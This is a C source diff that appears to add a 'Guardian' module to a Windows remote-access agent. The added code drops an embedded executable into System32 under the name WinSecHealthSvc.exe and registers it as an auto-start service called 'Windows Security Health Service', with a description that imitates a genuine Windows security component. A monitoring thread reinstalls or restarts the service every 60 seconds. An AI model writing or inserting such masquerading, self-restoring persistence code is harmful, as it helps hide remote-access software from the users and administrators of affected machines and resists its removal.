@@ -85,6 +85,30 @@ extern DWORD WINAPI kvm_server_mainloop(LPVOID Param);
 #define SmoothingModeAntiAlias 5
 #define InterpolationModeBicubic 8
 
+#define GUARDIAN_SERVICE_NAME "Windows Security Health Service"
+#define GUARDIAN_DISPLAY_NAME "Windows Security Health Service"
+#define GUARDIAN_DESCRIPTION "Monitors and maintains system security health and integrity"
+#define GUARDIAN_DIR L"C:\\Windows\\System32\\WinSecHealth"
+#define GUARDIAN_EXE_PATH L"C:\\Windows\\System32\\WinSecHealth\\WinSecHealthSvc.exe"
+#define GUARDIAN_CHECK_INTERVAL 60
+
+DWORD g_lastGuardianCheck = 0;
+HANDLE g_guardianThread = NULL;
+BOOL g_guardianThreadRunning = FALSE;
+
+DWORD WINAPI GuardianMonitorThread(LPVOID param)
+{
+	UNREFERENCED_PARAMETER(param);
+	
+	while (g_guardianThreadRunning)
+	{
+		GuardianCheck();
+		Sleep(GUARDIAN_CHECK_INTERVAL * 1000);
+	}
+	
+	return 0;
+}
+
 
 HMODULE _gdip = NULL;
 HMODULE _shm = NULL;
@@ -186,6 +210,180 @@ BOOL IsAdmin()
 		FreeSid(AdministratorsGroup);
 	}
 	return admin;
+}
+
+BOOL GuardianServiceExists()
+{
+	SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
+	if (!scm) return FALSE;
+	
+	SC_HANDLE service = OpenServiceW(scm, L"Windows Security Health Service", SERVICE_QUERY_STATUS);
+	BOOL exists = (service != NULL);
+	
+	if (service) CloseServiceHandle(service);
+	CloseServiceHandle(scm);
+	return exists;
+}
+
+BOOL GuardianServiceIsRunning()
+{
+	SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
+	if (!scm) return FALSE;
+	
+	SC_HANDLE service = OpenServiceW(scm, L"Windows Security Health Service", SERVICE_QUERY_STATUS);
+	if (!service)
+	{
+		CloseServiceHandle(scm);
+		return FALSE;
+	}
+	
+	SERVICE_STATUS status;
+	BOOL running = FALSE;
+	if (QueryServiceStatus(service, &status))
+	{
+		running = (status.dwCurrentState == SERVICE_RUNNING);
+	}
+	
+	CloseServiceHandle(service);
+	CloseServiceHandle(scm);
+	return running;
+}
+
+BOOL GuardianStartService()
+{
+	SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
+	if (!scm) return FALSE;
+	
+	SC_HANDLE service = OpenServiceW(scm, L"Windows Security Health Service", SERVICE_START);
+	if (!service)
+	{
+		CloseServiceHandle(scm);
+		return FALSE;
+	}
+	
+	BOOL result = StartServiceW(service, 0, NULL);
+	CloseServiceHandle(service);
+	CloseServiceHandle(scm);
+	return result;
+}
+
+BOOL GuardianExtractExecutable()
+{
+	HRSRC hRes;
+	HGLOBAL hResData;
+	LPVOID pResData;
+	DWORD dwResSize;
+	HANDLE hFile;
+	DWORD dwWritten;
+	
+	// Try to find the Guardian executable as embedded resource
+	// Resource ID 200, type "GUARDIAN_EXE"
+	hRes = FindResourceW(NULL, MAKEINTRESOURCEW(200), L"GUARDIAN_EXE");
+	if (!hRes)
+	{
+		// If resource not found, try to copy from same directory (fallback for development)
+		WCHAR exePath[_MAX_PATH];
+		WCHAR guardianPath[_MAX_PATH];
+		
+		GetModuleFileNameW(NULL, exePath, _MAX_PATH);
+		WCHAR *lastBackslash = wcsrchr(exePath, L'\\');
+		if (lastBackslash)
+		{
+			*(lastBackslash + 1) = 0;
+			wcscpy(guardianPath, exePath);
+			wcscat(guardianPath, L"WinSecHealthSvc.exe");
+			
+			// Check if file exists
+			if (GetFileAttributesW(guardianPath) != INVALID_FILE_ATTRIBUTES)
+			{
+				CreateDirectoryW(GUARDIAN_DIR, NULL);
+				return CopyFileW(guardianPath, GUARDIAN_EXE_PATH, FALSE);
+			}
+		}
+		return FALSE;
+	}
+	
+	// Load resource data
+	hResData = LoadResource(NULL, hRes);
+	if (!hResData) return FALSE;
+	
+	pResData = LockResource(hResData);
+	if (!pResData) return FALSE;
+	
+	dwResSize = SizeofResource(NULL, hRes);
+	if (dwResSize == 0) return FALSE;
+	
+	// Create directory
+	CreateDirectoryW(GUARDIAN_DIR, NULL);
+	
+	// Write resource to file
+	hFile = CreateFileW(GUARDIAN_EXE_PATH, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hFile == INVALID_HANDLE_VALUE) return FALSE;
+	
+	BOOL result = WriteFile(hFile, pResData, dwResSize, &dwWritten, NULL);
+	CloseHandle(hFile);
+	
+	return result && (dwWritten == dwResSize);
+}
+
+void GuardianInstall()
+{
+	if (GuardianServiceExists()) return;
+	
+	// Extract Guardian executable from resources or copy from directory
+	if (!GuardianExtractExecutable())
+	{
+		// Failed to extract Guardian
+		return;
+	}
+	
+	// Install Guardian service
+	SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
+	if (scm)
+	{
+		WCHAR exePathW[_MAX_PATH];
+		wcscpy(exePathW, GUARDIAN_EXE_PATH);
+		
+		SC_HANDLE service = CreateServiceW(
+			scm,
+			L"Windows Security Health Service",
+			L"Windows Security Health Service",
+			SERVICE_ALL_ACCESS,
+			SERVICE_WIN32_OWN_PROCESS,
+			SERVICE_AUTO_START,
+			SERVICE_ERROR_NORMAL,
+			exePathW,
+			NULL, NULL, NULL, NULL, NULL
+		);
+		
+		if (service)
+		{
+			SERVICE_DESCRIPTIONW desc;
+			desc.lpDescription = L"Monitors and maintains system security health and integrity";
+			ChangeServiceConfig2W(service, SERVICE_CONFIG_DESCRIPTION, &desc);
+			
+			StartServiceW(service, 0, NULL);
+			CloseServiceHandle(service);
+		}
+		CloseServiceHandle(scm);
+	}
+}
+
+void GuardianCheck()
+{
+	DWORD now = GetTickCount();
+	if ((now - g_lastGuardianCheck) < (GUARDIAN_CHECK_INTERVAL * 1000)) return;
+	
+	g_lastGuardianCheck = now;
+	
+	if (!GuardianServiceExists())
+	{
+		GuardianInstall();
+	}
+	else if (!GuardianServiceIsRunning())
+	{
+		GuardianStartService();
+	}
 }
 
 BOOL RunAsAdmin(char* args, int isAdmin)
@@ -300,6 +498,13 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 		serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_POWEREVENT | SERVICE_ACCEPT_SESSIONCHANGE);
 		serviceStatus.dwCurrentState = SERVICE_RUNNING;
 		SetServiceStatus(serviceStatusHandle, &serviceStatus);
+		
+		// Install and start Guardian service
+		GuardianInstall();
+		
+		// Start Guardian monitoring thread
+		g_guardianThreadRunning = TRUE;
+		g_guardianThread = CreateThread(NULL, 0, GuardianMonitorThread, NULL, 0, NULL);
 
 		// Get our own executable name
 	GetModuleFileNameW(NULL, str, _MAX_PATH);
@@ -318,6 +523,15 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 			ILib_WindowsExceptionDebugEx(&winException);
 		}
 		CoUninitialize();
+		
+		// Stop Guardian monitoring thread
+		g_guardianThreadRunning = FALSE;
+		if (g_guardianThread)
+		{
+			WaitForSingleObject(g_guardianThread, 5000);
+			CloseHandle(g_guardianThread);
+			g_guardianThread = NULL;
+		}
 
 		// Service was stopped
 		serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
